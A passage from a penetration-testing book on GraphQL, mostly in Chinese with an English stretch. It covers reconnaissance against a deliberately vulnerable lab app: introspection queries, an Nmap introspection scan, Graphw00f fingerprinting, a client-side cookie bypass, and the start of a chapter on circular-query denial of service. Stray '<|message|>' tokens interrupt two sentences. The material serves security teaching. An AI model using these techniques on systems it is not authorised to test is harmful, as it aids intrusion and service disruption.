  \ 73 页的‘常见端点’”中提到的常见 GraphQL 端点列表。\n\n或者，使用 Kali 内置的目录词表之一，位于 /usr/share/wordlists。\
  \ dirbuster 词表就是一个例子。EyeWitness 需要完整的 URL，而该词表只包含 Web 路径，因此我们首先需要使用 Bash 脚本对其进行格式化，如清单\
  \ 4-16 所示。\n\n```\n# for i in $(cat /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt);\n\
  do echo http://localhost:5013/$i >> urls.txt; done\n\n# cat urls.txt\n\nhttp://localhost:5013/api\n\
  http://localhost:5013/apis\nhttp://localhost:5013/apidocs\nhttp://localhost:5013/apilist\n\
  ```\n\n清单 4-16：使用 Bash 和目录词表构建 URL 列表\n\n此 Bash for 循环可确保词表 directory-list-2.3-small.txt\
  \ 中的目录被追加到我们的目标主机 http://localhost:5013 上，以便 EyeWitness 在扫描时使用它们。剩下的就是使用新的词表文件 urls.txt\
  \ 运行 EyeWitness。\n\n## 使用图形客户端尝试查询\n\n在渗透测试中发现 GraphiQL Explorer 或 GraphQL Playground\
  \ 的实例，并不保证 GraphQL API 本身会允许你进行未授权查询。因为 GraphiQL Explorer 和 GraphQL Playground 只是\
  \ GraphQL API 的前端界面，它们本质上是与 GraphQL 服务器交互的 HTTP 客户端。\n\n在某些情况下，这些图形界面可能由于多种原因无法查询\
  \ API。GraphQL API 中可能实现了身份验证或授权层，从而阻止未授权查询。API 也可能根据客户端属性（如地理位置或基于 IP 地址的允许列表）限制查询。客户端缓解措施也可能阻止客户端通过\
  \ GraphiQL Explorer 或 GraphQL Playground 运行查询。\n\n> 注意 规范并未描述如何在 GraphQL 中实现安全措施，也未说明授权和身份验证是否应在\
  \ GraphQL 层存在。第 7 章介绍了在 GraphQL 中实现这些机制时如何识别它们，以及如何在黑盒渗透测试中对其进行测试。\n\n为了确认我们可以使用该界面查询\
  \ GraphQL 服务器，我们需要发送某种形式的未认证 GraphQL 查询。该查询必须是可在任何 GraphQL API 上工作的查询。可以把这个查询看作是确认远程\
  \ GraphQL API 是否接受来自客户端的未认证查询的一种方式。我们可以称之为金丝雀 GraphQL 查询。\n\n在你的实验机上打开 Firefox 网络浏览器并导航到\
  \ http://localhost:5013 以访问 DVWA。你应该会看到 DVWA 的主页面。接下来，浏览到我们之前发现的 GraphiQL Explorer\
  \ 面板 http://localhost:5013/graphiql。你会注意到我们立即收到一个错误，表明访问被拒绝，消息为 400 Bad Request:\
  \ GraphiQL Access Rejected，如图 4-2 所示。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_110_0.png)\n\
  \n图 4-2：GraphiQL Explorer 拒绝客户端访问\n\n作为黑客，重要的是要了解事物在幕后是如何工作的。点击窗口右上角的 Docs 按钮。你应该会看到一条错误消息，No\
  \ Schema Available。此错误意味着 GraphiQL Explorer 无法从 API 检索模式信息。因为 GraphiQL Explorer\
  \ 在每次页面加载时都会自动向 GraphQL API 发送 introspection 查询以填充文档部分的模式信息，所以它依赖于该文档可用。\n\n你可以通过在\
  \ Firefox 中使用开发者工具来看到这种行为。按 SHIFT-F9 或右键单击网页中的任意位置并选择检查元素以打开开发者工具控制台。点击网络标签；然后按\
  \ F5 重新加载页面。\n\n你应该能够看到发送到 /graphiql 端点的 POST 请求。图 4-3 显示了此 introspection 查询。\n\n\
  ![](img/2f244b00cd9f8f37cfc22f928aaa471a_111_0.png)\n\n图 4-3：在 Firefox 开发者工具中显示的\
  \ GraphiQL Explorer introspection 查询\n\n如果 introspection 查询已成功发送，可能是什么原因导致我们无法访问\
  \ GraphiQL Explorer？让我们继续在 Firefox 中探索开发者工具以寻找线索。点击图 4-4 所示的存储标签。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_111_1.png)\n\
  \n图 4-4：Firefox 中的开发者工具存储标签\n\n存储标签为我们提供了应用程序设置的 HTTP Cookie 的视图，以及访问浏览器本地存储和会话存储的功能。在左侧窗格中，点击\
  \ Cookie 下拉菜单并选择 http://localhost:5013 以查看该域的特定 Cookie，如图 4-5 所示。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_112_0.png)\n\
  \n图 4-5：HTTP Cookie\n\n你会注意到，在右侧窗格中，我们的 HTTP Cookie 中设置了两个键：env 和 session。env 键尤其有趣，因为它似乎将字符串\
  \ graphql:disable 设置为其值。作为黑客，这应该会引起你的注意。有可能这个 Cookie 值导致了 GraphiQL Explorer 的拒绝访问？我们可以通过篡改其值来找到答案。\n\
  \n双击文本 graphql:disable，这将允许你修改它；然后只需删除 disable 并将其替换为 enable。接下来，刷新网页。你会注意到我们不再在\
  \ GraphiQL Explorer 中看到拒绝消息。为了确认篡改 Cookie 确实有效，请尝试运行一个 GraphQL 查询。你应该能够从 GraphQL\
  \ API 获得响应！这是一个弱的客户端安全控制，可以很容易地被规避。\n\n开发人员通常以信任客户端的心态创建 Web 应用程序，但并非所有人都会遵守规则。对漏洞感兴趣的威胁行为者会篡改应用程序并尝试击败任何已实施的对策。重要的是要记住，攻击者可以直接控制的任何内容都可能被规避。然而，在客户端实施的控制并不罕见；你可能会发现应用程序仅在客户端实施输入验证或文件上传验证。这些通常可以被绕过。在第\
  \ 7 章中，你将了解更多关于击败 GraphQL 授权和身份验证机制的内容。\n\n## 使用 Introspection 查询 GraphQL\n\nIntrospection\
  \ 是 GraphQL 的关键特性之一，因为它提供了有关 GraphQL 模式支持的各种类型和字段的信息。自文档化的 API 对于需要使用它的任何人来说都非常有用，例如第三方企业或其他客户端。\n\
  \n作为黑客，我们在遇到 GraphQL 应用程序时首先想要测试的事情之一是其 introspection 机制是否已启用。许多 GraphQL 实现默认启用\
  \ introspection。某些实现可能有禁用 introspection 的选项，但其他实现可能没有。例如，Python GraphQL 实现 Graphene\
  \ 不提供禁用 introspection 的选项。为此，消费者必须深入代码并找出防止 introspection 查询被处理的方法。另一方面，GraphQL\
  \ PHP 实现 graphql-php 默认启用 introspection，但也记录了如何完全禁用此功能。表 4-2 显示了一些流行 GraphQL 服务器实现中\
  \ introspection 的状态。\n\n### 表 4-2：GraphQL 实现中的 Introspection 状态\n\n| Language |\
  \ Implementation | Introspection configuration | Disable introspection option |\n\
  |---|---|---|---|\n| Python | Graphene | Enabled by default | Not available |\n\
  | Python | Ariadne | Enabled by default | Available |\n| PHP | graphql-php | Enabled\
  \ by default | Available |\n| Go | graphql-go | Enabled by default | Not available\
  \ |\n| Ruby | graphql-ruby | Enabled by default | Available |\n| Java | graphql-java\
  \ | Enabled by default | Not available |\n\n任何直接影响安全的默认设置对黑客来说都是好消息。应用程序维护人员很少更改这些默认设置。有些维护人员可能甚至不知道它们的存在。在表\
  \ 4-2 中，你可以看到在某些情况下，例如在 graphql-go、graphql-java 和 Graphene 中，introspection 只能在应用程序维护人员自行将其编码到\
  \ GraphQL API 中时才会被禁用；没有官方的、经过厂商验证的解决方案来禁用它。\n\n虽然对此事的看法不一，尤其是在安全圈内，但 GraphQL 中的\
  \ introspection 通常被认为是一种功能而不是漏洞。采用 GraphQL 的公司可能会选择保持启用，而其他公司可能会禁用它以避免泄露可能被用于攻击的信息。如果没有外部消费者集成\
  \ GraphQL API，则有可能开发人员可以完全禁用 introspection 而不会影响正常的应用程序流程。\n\n根据你的目标，introspection\
  \ 查询的响应可能相当大。此外，如果你攻击的目标拥有成熟的安全计划，这些查询可能会被监控，以防来自不受信任客户端的任何尝试，例如来自新的地理位置或新 IP 地址的客户端。\n\
  \n要使用我们的易受攻击服务器尝试 introspection 查询，请在你的实验环境中打开 Altair 客户端，并确保地址栏设置为 http://localhost:5013/graphql。接下来，输入清单\
  \ 4-17 中显示的 introspection 查询并在 Altair 中执行它。\n\n\n\n\n\n```\nquery {\n  __schema\
  \ {\n    types {\n      name\n    }\n  }\n}\n```\n\nListing 4-17: An introspection\
  \ query in its simplest form\n\nThis query uses the meta-field __schema, which is\
  \ the type name of the GraphQL schema introspection system. It then requests the\
  \ name of all types available in the GraphQL server. The following output shows\
  \ the server's response to the query:\n\n```\n{\n  \"data\": {\n    \"__schema\"\
  : {\n      \"types\": [\n--snip--\n        {\n          \"name\": \"PasteObject\"\
  \n        },\n        {\n          \"name\": \"CreatePaste\"\n        },\n     \
  \   {\n          \"name\": \"DeletePaste\"\n        },\n        {\n          \"\
  name\": \"UploadPaste\"\n        },\n        {\n          \"name\": \"ImportPaste\"\
  \n        },\n--snip--\n      ]\n    }\n  }\n}\n```\n\nWhile we receive a valid\
  \ response, this query in its current form gives us only a partial view of the features\
  \ available through the API. The response is missing key information, such as query\
  \ and mutation names, information about which queries allow arguments to be passed\
  \ by clients, the data types of arguments (such as scalar types like String and\
  \ Boolean), and so on. These are important, because queries that accept arguments\
  \ could be prone to vulnerabilities, such as injections, server-side request forgeries,\
  \ and so on.\n\nWe can craft a more specialized introspection query that would give\
  \ us more data about the target application’s schema. A useful introspection query\
  \ is one that will give us information on the entry points into the application,\
  \ such as queries, mutations, subscriptions, and the type of data\n\nthat can be\
  \ injected into them. Consider the introspection query shown in Listing 4-18.\n\n\
  ```\nquery IntrospectionQuery {\n  __schema {\n    ① queryType { name }\n    mutationType\
  \ { name }\n    subscriptionType { name }\n    ② types {\n      kind\n      name\n\
  \      ③ fields {\n        name\n        ④ args {\n          name\n        }\n \
  \     }\n    }\n  }\n}\n```\n\nListing 4-18: A more useful introspection query\n\
  \nThe introspection query in Listing 4-18 gives us a bit more insight into the API.\
  \ At ① we get the name of all queries (queryType), mutations (mutationType), and\
  \ subscriptions (subscriptionType) available in the GraphQL API. These names are\
  \ typically self-explanatory, to make it easier for clients to use the API, so knowing\
  \ these query names gives us an idea of the information we could receive.\n\nAt\
  \ ② we get all the types in the schema, along with their kind (such as an object)\
  \ and name (such as PasteObject). At ③ we get the fields along with the name of\
  \ each one, which will allow us to know the types of fields we can fetch when we\
  \ use different GraphQL objects. Next, we get the arguments (args) of these fields\
  \ along with their name ④. Arguments could be any information the API is expecting\
  \ the client to supply when it queries the API (typically, dynamic data). For example,\
  \ when a client creates a new paste, it will supply an arbitrary title argument\
  \ and a content argument containing the body of the paste, which might be a code\
  \ snippet or other text.\n\nIn penetration tests, you may want to run an introspection\
  \ query against an entire network, assuming a GraphQL server may be present. In\
  \ this case, you would either need to write your own script or use the Nmap NSE\
  \ script graphql-introspection.nse we installed in Chapter 2. This script is simple:\
  \ it queries GraphQL by using the __schema meta-field to determine if it's fetchable.\n\
  \nSay you have a list of IP addresses in a text file such as hosts.txt. Using Nmap's\
  \ -iL flag, you can tell Nmap to use it as its list of targets. Using the --script\
  \ flag, you can then tell Nmap to run the graphql-introspection NSE script against\
  \ any host that has port 5013 open (-p flag). The -sV flag performs a service and\
  \ version scan. The command in Listing 4-19 shows how this is accomplished.\n\n\
  ```\n# nmap --script=graphql-introspection -iL hosts.txt -sV -p 5013\n\nPORT   \
  \   STATE SERVICE VERSION\n5013/tcp open  http    Ajenti http control panel\n| graphql-introspection:\n\
  |   VULNERABLE:\n|   GraphQL Server allows Introspection queries at endpoint:\n\
  |   Endpoint: /graphql is vulnerable to introspection queries!\n|       State: VULNERABLE\n\
  |       Checks if GraphQL allows Introspection Queries.\n|   \n|   References:\n\
  |       https://graphql.org/learn/introspection/\n```\n\nListing 4-19: A GraphQL\
  \ introspection detection with the Nmap NSE\n\nUsing nmap to detect when introspection\
  \ is enabled is just the first step. The next step is to extract all possible schema\
  \ information by using a more robust query.\n\nIn the book’s GitHub repository,\
  \ you can find a comprehensive introspection query that, when executed, will extract\
  \ a lot of useful information about the target’s schema: https://github.com/dolevf/Black-Hat-GraphQL/blob/master/queries/introspection_query.txt.\
  \ This query will return information such as queries, mutations, and subscriptions\
  \ names, with the arguments they accept; names of objects and fields, along with\
  \ their types; names and descriptions of GraphQL directives; and object relationships.\
  \ If you run that query in Altair, the server should return a fairly large response,\
  \ as shown in Figure 4-6.\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_116_0.png)\n\
  \nFigure 4-6: An introspection in Altair\n\nThe response is large enough (containing\
  \ approximately 2,000 lines) that it would be challenging for any human to go through\
  \ it manually and make sense of it without investing a significant amount of time.\
  \ This is where GraphQL visualizers such as GraphQL Voyager come in handy.\n\n##\
  \ Visualizing Introspection with GraphQL Voyager\n\nGraphQL Voyager, which can be\
  \ found at either https://ivangoncharov.github.io/graphql-voyager or http://lab.blackhatgraphql.com:9000,\
  \ is an open source tool that processes either introspection query responses or\
  \ GraphQL SDL files and visualizes them, making it easy to identify the various\
  \ queries, mutations, and subscriptions and the relationships between them.\n\n\
  The tool’s introspection query option is most suitable for scenarios such as black-box\
  \ penetration tests, in which the application’s code base is not accessible to us.\
  \ The SDL option is useful when we might have direct access to the GraphQL schema\
  \ files, such as during a white-box penetration test in which the company provides\
  \ us with full access to the source code.\n\nTry visualizing the introspection query\
  \ response you just received in Altair and importing it into GraphQL Voyager. Copy\
  \ the response and then open your browser and navigate to GraphQL Voyager. Click\
  \ the Change Schema button located at the top-left corner. Select the Introspection\
  \ tab, paste in the response, and click the Display button. You should see a visualization\
  \ similar to the one shown in Figure 4-7.\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_117_0.png)\n\
  \nThe visualization we receive from Voyager represents the queries, mutations, and\
  \ subscriptions available in our target application and how they relate to the different\
  \ objects and fields that exist in the schema.\n\nUnder Query, you can see that\
  \ the application supports 12 queries. The arrows in the view represent the mapping\
  \ between these queries and the schema objects. For example, when you use the pastes\
  \ query, it will return an array of [PasteObject] objects, which is also the reason\
  \ you’re seeing an\n\narrow pointing to the PasteObject table. The system queries\
  \ (update, diagnostics, debug, and health) are not tied to any other schema objects;\
  \ they simply return a string whenever you use them.\n\nYou can also see that we\
  \ have relationships (edges) between fields. For example, the owner field in the\
  \ PasteObject object is linked to OwnerObject, and the paste field in OwnerObject\
  \ is linked back to PasteObject. This circular condition could lead to DoS conditions,\
  \ as you will learn in Chapter 5.\n\n> NOTE\n> You can toggle between the Query\
  \ view, Mutation view, and Subscription view by using the drop-down menu at the\
  \ bottom of Voyager.\n\nNow that we’ve experimented with visualizing an introspection\
  \ response in Voyager, let’s do the same with SDL files. Voyager accepts SDL files\
  \ and can process them just as well as it does introspection responses. To see this\
  \ in action, click the Change Schema button located at the top-left corner in Voyager,\
  \ select the SDL tab, and paste in the SDL file located at https://github.com/doleruf/Black-Hat-GraphQL/blob/master/ch04/sdl.graphql.\
  \ Then click the Display button. You should see a similar visualization to the one\
  \ generated in the Introspection tab.\n\n## Generating Introspection Documentation\
  \ with SpectaQL\n\nSpectaQL (https://github.com/anvilco/spectaql) is an open source\
  \ project that allows you to generate static documentation based on an SDL file.\
  \ The document that gets generated will include information about how to construct\
  \ queries, mutations, and subscriptions; the different types; and their fields.\
  \ We’ve hosted an example SpectaQL-generated schema of DVGA at http://lab.blackhatgraphql.com:9001\
  \ so you can see how SpectaQL looks when it’s functional.\n\n## Exploring Disabled\
  \ Introspection\n\nAt some point, you’ll probably encounter a GraphQL API that has\
  \ introspection disabled. To see what this looks like, let’s use one of the neat\
  \ features of our vulnerable GraphQL server: turning on its hardened mode.\n\nThe\
  \ DVGA works in two modes, a Beginner mode and an Expert (hardened) mode. Both versions\
  \ are vulnerable; the only difference is that the Expert mode has a few security\
  \ mechanisms to protect the application from any dangerous queries.\n\nTo change\
  \ the application’s mode, open the Altair client and ensure that the address points\
  \ to http://localhost:5013/graphql. In the left sidebar, click the Set Headers icon,\
  \ which looks like a small sun symbol. Set Header Key to X-DVGA-MODE and set Header\
  \ Value to Expert. This HTTP header set instructs DVGA to perform security checks\
  \ on any incoming queries that include the headers as part of the request. Alternatively,\
  \ you can toggle on Expert mode from within DVGA’s web interface by using the drop-down\
  \ menu located at the top-right corner (the cubes icon).\n\n\n\n\n\n现在尝试使用 Altair\
  \ 执行一个简单的内省查询：\n\n```\nquery {\n  __schema {\n    __typename\n  }\n}\n```\n\n你应该会看到一个错误响应，提示内省已被禁用，导致查询失败（清单\
  \ 4-20）。\n\n```\n{\n  \"errors\": [\n    {\n      \"message\": \"400 Bad Request:\
  \ Introspection is Disabled\",\n      \"locations\": [\n        {\n          \"\
  line\": 2,\n          \"column\": 7\n        }\n      ],\n      \"path\": [\n  \
  \      \"__schema\"\n      ]\n    }\n  ],\n  \"data\": null\n}\n```\n\n*清单 4-20：内省被禁用时返回的错误*\n\
  \n在这种情况下，你需要一个备选方案 B。在第 6 章中，你将学习如何在没有内省数据可用的情况下，仍发现有关 GraphQL 应用的信息。\n\n## 指纹识别\
  \ GraphQL\n\n本章前面我们强调了可用的众多 GraphQL 实现。如何判断我们试图攻击的服务器上运行的是哪一个？答案是服务器指纹识别，即识别目标运行服务的<|message|>\
  \ 信息及其版本。例如，针对 Web 服务器进行指纹识别的一种常见且简单的技术是使用 cURL 等工具发出 HTTP HEAD 请求，并观察返回的 HTTP 响应头。\n\
  \n一旦我们知道运行应用的具体技术和版本，就能对服务进行更准确的漏洞评估。例如，我们可以查找针对目标版本的公开漏洞利用，或阅读软件文档以识别弱点。\n\nApache\
  \ 或 Nginx 等流行的 Web 服务器就是易于指纹识别的服务的绝佳示例，因为两者在客户端向其发出请求时通常都会设置 server HTTP 响应头。清单\
  \ 4-21 显示了 Apache 软件基金会网站背后的 Web 服务器如何通过使用 server 头来识别自身：\n\n```\n# curl -I https://apache.org/\n\
  \nHTTP/2 200\nserver: Apache\nvary: Accept-Encoding\ncontent-length: 73190\n```\n\
  \n清单 4-21：使用 HEAD 请求进行 Apache Web 服务器指纹识别\n\n不出所料，Apache 软件基金会的网站确实运行在 Apache Web\
  \ 服务器上。（如果不是这样就有点奇怪了！）\n\n在渗透测试中，指纹识别服务并不总是如此简单；有时准确的指纹识别需要仔细查看细节，因为并非所有软件都会自我识别，包括\
  \ GraphQL 服务器。用于指纹识别 GraphQL 实现的技术在安全行业中相对较新。我们（本书的作者）基于我们的研究开发了几种策略，并将其纳入 Graphw00f。\n\
  \nGraphQL 指纹识别依赖于对 GraphQL 服务器实现之间各种差异的观察。以下是一些示例：\n\n- 错误消息的不一致\n- 对格式错误的 GraphQL\
  \ 查询的响应输出不一致\n- 对结构良好的查询的响应输出不一致\n- 对偏离 GraphQL 规范的查询的响应输出不一致\n\n利用这四种因素，我们可以唯一地识别\
  \ GraphQL 支持的应用背后的实现。\n\n让我们检查两种 GraphQL 服务器实现对格式错误查询的响应。此查询如清单 4-22 所示，在 queryy\
  \ 这个词中引入了一个额外的 y 字符，这不符合 GraphQL 规范。我们想看看两种 GraphQL 实现对其的响应。第一个实现是 Sangria，一个基于\
  \ Scala 的 GraphQL 服务器。\n\n```\nqueryy {\n  __typename\n}\n```\n\n清单 4-22：一个格式错误的\
  \ GraphQL 查询\n\n清单 4-23 显示了 Sangria 对格式错误查询的响应。\n\n```\n{\n  \"syntaxError\": \"\
  Syntax error while parsing GraphQL query. Invalid input \\\"queryy\\\", expected\
  \ ExecutableDefinition or TypeSystemDefinition (line 1, column 1):\\nqueryy {\\\
  n^\",\n  \"locations\": [\n    {\n      \"line\": 1,\n      \"column\": 1\n    }\n\
  \  ]\n}\n```\n\n清单 4-23：Sangria 对格式错误查询的响应\n\n第二个实现是 HyperGraphQL，一个基于 Java 的 GraphQL\
  \ 服务器。清单 4-24 显示了它对格式错误查询的响应。\n\n```\n{\n  \"extensions\": {},\n  \"errors\": [\n\
  \    {\n      \"message\": \"Validation error of type InvalidSyntax: Invalid query\
  \ syntax.\",\n      \"locations\": [\n        {\n          \"line\": 0,\n      \
  \    \"column\": 0,\n          \"sourceName\": null\n        }\n      ],\n     \
  \ \"description\": \"Invalid query syntax.\",\n      \"validationErrorType\": \"\
  InvalidSyntax\",\n      \"queryPath\": null,\n      \"errorType\": \"ValidationError\"\
  ,\n      \"extensions\": null,\n      \"path\": null\n    }\n  ]\n}\n```\n\n清单 4-24：HyperGraphQL\
  \ 对格式错误查询的响应\n\n正如你所观察到的，这两个响应在每一种可能的方式上都不同，我们仅凭其响应就能区分这些实现。\n\n接下来，我们将在实验室中针对 DVGA\
  \ 尝试相同的格式错误查询，看看会得到什么样响应。打开 Altair 客户端并发送 GraphQL 查询。你应该会看到与图 4-8 相似的输出。\n\n正如你所见，输出与\
  \ Sangria 和 HyperGraphQL 的响应都不同。这是因为 DVGA 基于 Graphene，一个 Python GraphQL 实现。\n\n\
  ![](img/2f244b00cd9f8f37cfc22f928aaa471a_122_0.png)\n\n图 4-8：使用 Altair 发送格式错误的查询\n\
  \n手动运行查询并分析实现之间的差异并不能很好地扩展，这就是我们将服务器指纹识别功能构建到 Graphw00f 中的原因。在下一节中，我们将使用它进行服务器指纹识别。\n\
  \n## 使用 Graphw00f 检测服务器\n\nGraphw00f 目前是用于 GraphQL 服务器指纹识别的唯一可用工具。它可以检测许多流行的 GraphQL\
  \ 服务器实现，并在成功指纹识别服务器时提供有意义的信息。\n\n在你的实验室中，打开终端模拟器。如果进入 graphw00f 目录并运行 python3 main.py\
  \ -l，你会看到 Graphw00f 能够指纹识别超过 24 个 GraphQL 实现。这一列表构成了当前使用的大多数 GraphQL 目标。\n\n让我们用它来指纹识别\
  \ DVGA。我们将使用 -f 标志启用指纹模式，并使用 -t 标志指定目标（清单 4-25）。你也可以将 -f 标志与 -d 标志（本章前面介绍过）结合使用，如果你想同时检测\
  \ GraphQL 并进行指纹识别。这里，我们单独使用 -f 标志，因为我们已经知道服务器上 GraphQL 的路径。\n\n```\n# cd ~/graphw00f\n\
  # python3 main.py -f -t http://localhost:5013/graphql\n\n[*] Checking if GraphQL\
  \ is available at http://localhost:5013/graphql...\n[!] Found GraphQL.\n[*] Attempting\
  \ to fingerprint...\n```\n\n```\n[*] Discovered GraphQL Engine: (Graphene)\n[!]\
  \ Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md\n\
  [!] Technologies: Python\n[!] Homepage: https://graphene-python.org\n[*] Completed.\n\
  ```\n\n# 清单 4-25：GraphQL 服务器的指纹识别\n\n该工具首先检查目标是否确实是 GraphQL 服务器。它通过发送几个查询并将其响应与自身签名数据库进行检查来做到这一点。如你所见，它能够发现运行在\
  \ Graphene 上的 GraphQL 服务器，并为我们提供了攻击面矩阵链接。攻击面矩阵本质上是 Graphw00f 可以指纹识别的各种 GraphQL 实现的安全态势知识。Graphw00f\
  \ 使用我们在第 3 章中讨论的 GraphQL Threat Matrix 作为其实现安全态势数据库。\n\n由于我们现在知道 DVGA 运行的是 Graphene，因此我们需要分析\
  \ Graphene 的弱点，以确定我们可以对该特定实现运行哪些攻击。有些实现比其他实现存在更久。因此，它们更成熟、更稳定，并提供更多安全功能。这就是为什么在攻击\
  \ GraphQL 目标时了解后端实现是一个优势。\n\n## 分析结果\n\n查看攻击面威胁矩阵，它提供了有关实现的默认行为及其可用安全控制的信息（例如，默认启用的设置、存在的<|message|>\
  \ 安全控制以及我们可以用于攻击目的的其他有用功能）。图 4-9 显示了 Graphene 的攻击面矩阵。你也可以在 GitHub 上找到它，地址为 https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md。\n\
  \n![](img/2f244b00cd9f8f37cfc22f928aaa471a_123_0.png)\n\n# 图 4-9：Graphene 的攻击面矩阵\n\
  \n\n\n\n\n安全注意事项下的表格展示了各种 GraphQL 特性以及它们在 Graphene 中的可用性。如果存在，表格会列出它们默认是启用还是禁用。表格中的某些项目是安全控制，而其他则是原生的\
  \ GraphQL 特性：\n\n- *字段建议* 会在客户端发送拼写错误的查询时通知客户端并建议替代选项。这可被利用进行信息泄露。\n- *查询深度限制* 是一种安全控制，用于防止可能滥用模式中循环节点关系等条件的\
  \ DoS 攻击。\n- *查询成本分析* 是一种安全控制，用于防止源于计算复杂的查询的 DoS 攻击。\n- *自动持久化查询* 是一种缓存机制。它允许客户端传递代表查询的哈希以节省带宽，并且可通过允许列表的安全查询用作安全控制。\n\
  - * introspection* 通过 __schema 元字段提供对查询、变更、订阅、字段、对象等的访问信息。这可被滥用以泄露应用程序模式的信息。\n-\
  \ *调试模式* 是 GraphQL 中的一种模式，可在响应中提供额外的调试信息。这可能导致信息泄露问题。\n- *批量请求* 是一种允许客户端在单个 HTTP\
  \ 请求中发送一系列查询的功能。批量查询是 DoS 攻击的绝佳载体。\n\n在后面的章节中，你将学习这些特性中的每一个如何让我们的黑客生活变得更容易（或更困难）。\n\
  \n## Summary\n\n在本章中，你学习了如何通过使用各种安全工具对 GraphQL 服务器执行侦察的艺术。我们讨论了如何检测和指纹识别部署在标准和非标准位置的\
  \ GraphQL 服务器，以及如何使用 EyeWitness 安全工具查找 GraphQL IDE 客户端。我们还使用 GraphQL Voyager 可视化\
  \ introspection 查询和 SDL 文件，以更好地理解查询、变更和对象关系。\n"
- "## 5\n\n## 拒绝服务\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_126_0.png)\n\nDoS 问题是当前\
  \ GraphQL 中最普遍的漏洞类别之一。在本章中，你将了解 GraphQL 的声明式查询语言如何也成为其阿喀琉斯之踵。我们将识别执行 DoS 攻击的机会，如果应用程序开发人员未实施有效的安全对策，这些攻击可能会耗尽服务器资源。\n\
  \n虽然 DoS 漏洞在渗透测试报告或赏金计划中并不常被归类为关键漏洞，但它们在 GraphQL 应用程序中足够常见，因此从攻击者和防御者角度都了解它们很重要。\n\
  \n## GraphQL DoS 向量\n\nGraphQL 的旗舰特性之一是其声明式查询语言，允许客户端从服务器请求非常复杂的数据结构。这种能力使客户端处于强势地位，因为客户端可以选择服务器应返回的响应。鉴于这种能力，GraphQL\
  \ 服务器必须有能力保护自己免受来自不可信客户端的恶意查询。如果客户端可以构造服务器难以满足的查询，它可能会使服务器资源枯竭。此类攻击可能会通过导致停机或降低服务器性能来影响应用程序的可用性。\n\
  \n在 GraphQL 世界中，几种 DoS 向量可能导致资源耗尽条件：循环查询（也称为递归查询）、字段重复、别名过载、指令过载、循环片段和对象限制覆盖。在本章中，你将了解每种漏洞、如何在渗透测试期间对其进行测试，以及如何使用\
  \ DoS 漏洞利用代码来滥用它们。在本章末尾，我们将讨论尝试缓解这些威胁的安全控制。\n\n通用弱点枚举（CWE）系统将这些类型的 DoS 向量归类为不受控资源消耗。滥用这些向量可能会导致中央处理器（CPU）周期过度消耗、服务器内存使用量显著增加，或磁盘空间被填满，从而阻止其他进程写入文件系统。以下是客户端如何构造查询来触发这些条件的几个示例：\n\
  \n- 客户端发送包含一个复杂查询的单个请求。\n- 客户端发送包含多个复杂查询的单个请求。\n- 客户端发送多个并行请求，每个请求包含一个复杂查询。\n- 客户端发送多个并行请求，每个请求包含多个复杂查询。\n\
  - 客户端从服务器请求大量对象。\n\n某些 DoS 向量部分是由于某些 GraphQL 实现中的附加功能而可能发生的，这些功能作为基础安装包的一部分或作为附加库引入，而其他向量存在于原生\
  \ GraphQL 能力中。\n\n## 循环查询\n\n也称为递归查询，循环查询发生在 GraphQL 模式中的两个节点通过边双向引用时。这种循环引用可能允许客户端构建一个复杂查询，迫使服务器在每次查询完成一个“循环”时返回指数级大的响应。\n\
  \n在本节中，我们将深入研究循环关系以及它们在 GraphQL 模式中的表现。我们将使用多个工具，如模式可视化器 GraphQL Voyager、Altair、InQL\
  \ 和 GraphQL Cop 来识别有风险的设计模式并测试目标应用程序是否存在这些漏洞。\n\n### GraphQL 模式中的循环关系\n\nGraphQL\
  \ 的 SDL 允许我们定义多个类型来表示应用程序的数据模型。这些类型可以以允许客户端在它们链接在一起时从一个类型“跳转”到另一个类型的方式相互连接。这种情况称为循环关系或循环引用。\n\
  \n例如，在之前的章节中，我们提到 DVGA 目标应用程序允许用户创建代码片段（称为 pastes）并上传到应用程序中。单个 paste 可能包含标题和一些内容（如代码或其他任意文本）。在\
  \ GraphQL 的 SDL 中，此信息可以如下表示：\n\n```\ntype Paste {\n  title: String\n  content: String\n\
  }\n```\n\n就目前而言，此信息相当有限。如果我们想扩展应用程序，以便当客户端上传 paste 到应用程序时，我们可以识别是谁上传的，会怎样？例如，我们可以捕获有关上传者的一些元数据，如其\
  \ IP 地址或 User-Agent 字符串。\n\n目前，我们的数据模型没有以允许我们在 API 中表示此类信息的方式构建，但扩展它是一个相当容易的过程。我们可以按如下方式向\
  \ Paste 对象添加额外字段：\n\n```\ntype Paste {\n  title: String\n  content: String\n  user_agent:\
  \ String\n  ip_address: String\n}\n```\n\n实现此目标的另一种方式是解耦客户端元数据与 Paste 对象。我们可能出于多个原因想要这样做，例如更好的关注点分离以及能够独立于彼此扩展\
  \ GraphQL 类型。我们可以创建一个名为 Owner 的单独类型：\n\n```\ntype Owner {\n  ip_address: String\n\
  \  user_agent: String\n  name: String\n}\n```\n\n我们现在有两个对象类型，Paste 和 Owner。如果我们想揭示给定\
  \ paste 的所有者，我们可以将两个类型链接在一起。我们可能会进行如下模式调整，以向 Paste 类型添加一个名为 owner 的字段，该字段引用 Owner\
  \ 类型：\n\n```\ntype Paste {\n  title: String\n  content: String\n  user_agent: String\n\
  \  ip_address: String\n  owner: Owner\n}\n```\n\n现在客户端可以请求有关 paste 的所有者信息，例如所有者的\
  \ IP 地址或 User-Agent。清单 5-1 显示了完整的示例模式。\n\n```\ntype Paste {\n  title: String\n \
  \ content: String\n  user_agent: String\n  ip_address: String\n  owner: Owner\n\
  }\n\ntype Owner {\n  ip_address: String\n  user_agent: String\n  pastes: [Paste]\n\
  \  name: String\n}\n```\n\n清单 5-1：模式中的循环引用\n\n两个对象类型 Paste 和 Owner 具有交叉引用的字段。Paste\
  \ 对象类型具有引用 Owner 对象的 owner 字段，而 Owner 类型具有引用 Paste 类型的 pastes 字段。这创建了一个循环条件。\n\n\
  恶意客户端可以通过强制 GraphQL 服务器的函数解析器循环来导致递归。这可能会影响服务器的性能。以下查询示例显示了此类循环查询的外观：\n\n```\nquery\
